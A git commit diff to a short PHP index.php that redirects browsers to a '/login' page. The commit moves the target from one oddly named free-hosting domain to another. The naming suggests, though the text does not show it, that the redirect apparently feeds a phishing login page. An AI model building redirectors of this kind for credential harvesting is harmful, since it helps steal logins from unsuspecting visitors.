2a1dbade2449392012790ab00e2741f420e942ef
xmanmode147 <100860554+xmanmode147@users.noreply.github.com>
2022-03-03 22:13:38 -0800

    Update index.php

--- index.php
+++ index.php
@@ -1,7 +1,7 @@
 <?php 
   
 // Redirect browser 
-header("Location: http://01secure02securebag03.otzo.com/login"); 
+header("Location: http://01brainey04enterprise.wwwhost.biz/login"); 
   
 exit; 
 ?> 
